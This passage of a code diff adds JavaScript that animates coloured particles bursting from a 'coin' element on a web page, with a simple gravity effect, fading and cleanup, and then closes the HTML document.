+            particle.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+            particle.style.borderRadius = '50%';
+            particle.style.pointerEvents = 'none';
+            particle.style.zIndex = '1000';
+            
+            const coinRect = document.getElementById('coin').getBoundingClientRect();
+            particle.style.left = coinRect.left + coinRect.width / 2 + 'px';
+            particle.style.top = coinRect.top + coinRect.height / 2 + 'px';
+            
+            document.body.appendChild(particle);
+            
+            const angle = (Math.PI * 2 * i) / 50;
+            const velocity = 2 + Math.random() * 3;
+            
+            let x = 0, y = 0;
+            const animate = () => {
+                x += Math.cos(angle) * velocity;
+                y += Math.sin(angle) * velocity + 0.5; // gravity
+                
+                particle.style.transform = `translate(${x}px, ${y}px)`;
+                particle.style.opacity = Math.max(0, 1 - Math.abs(y) / 200);
+                
+                if (Math.abs(y) < 200) {
+                    requestAnimationFrame(animate);
+                } else {
+                    particle.remove();
+                }
+            };
+            
+            setTimeout(() => animate(), i * 20);
+        }
+    }
+
+    </script>
+</body>
+</html>
